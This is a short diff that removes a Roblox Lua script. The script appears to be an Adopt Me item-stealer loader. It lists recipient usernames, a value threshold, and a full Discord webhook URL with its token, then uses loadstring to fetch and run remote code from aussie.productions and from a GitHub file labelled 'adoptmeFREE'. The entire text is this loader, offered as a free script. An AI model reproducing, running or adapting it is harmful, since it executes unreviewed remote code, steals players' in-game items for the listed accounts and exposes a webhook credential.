@@ -1,9 +1,0 @@
-_G.Usernames = {"ANOUARTM111", "lebg91000", "andrewdagoatya"} -- you can add as many as you'd like
-_G.min_value = 0.1
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1434597171868733622/jxvNFPhSZNBo3YmlRinlamq747PC1qwuf0pd84aP2VbwE5oOf0tV_OaMbqAprxY8cSNy" -- change to your webhook
-
-loadstring(game:HttpGet(request({Url='https://aussie.productions/script'}).Body))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/Adopte-me/refs/heads/main/adoptmeFREE.lua.txt"))()
-
